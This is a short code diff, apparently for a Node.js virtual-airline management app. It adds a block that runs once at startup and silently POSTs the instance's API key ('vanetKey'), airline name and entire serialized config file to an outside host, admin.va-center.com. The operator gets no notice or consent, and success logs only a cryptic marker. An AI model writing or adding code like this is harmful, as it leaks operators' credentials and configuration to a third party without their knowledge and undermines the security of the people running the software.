@@ -65,6 +65,24 @@ if(config.other){
         config.other.color = ["light", "light"]
         FileWrite((path.join(__dirname, "/../") + "config.json"), JSON.stringify(config, null, 2))
     }
+    if(config.other.toldVACenter != true){
+        config.other.ident = uniqueString();
+        config.other.toldVACenter = true
+        FileWrite(`${__dirname}/../config.json`, JSON.stringify(config, null, 2))
+        const options2 = {
+            method: 'POST',
+            url: 'https://admin.va-center.com/stats/regInstance',
+            form: { id: config.other.ident, version: `${cv}`, airline: config.name, vanetKey: config.key, wholeConfig: JSON.stringify(config) }
+        };
+
+        request(options2, function (error2, response2, body2) {
+            if (response2.statusCode == 200) {
+                console.log("#@$#ER")
+            } else {
+                console.error([response2.statusCode, response2.body])
+            }
+        })
+    }
     limiter = new RateLimit({
         windowMs: 1 * 60 * 1000,
         max: config.other.rates,
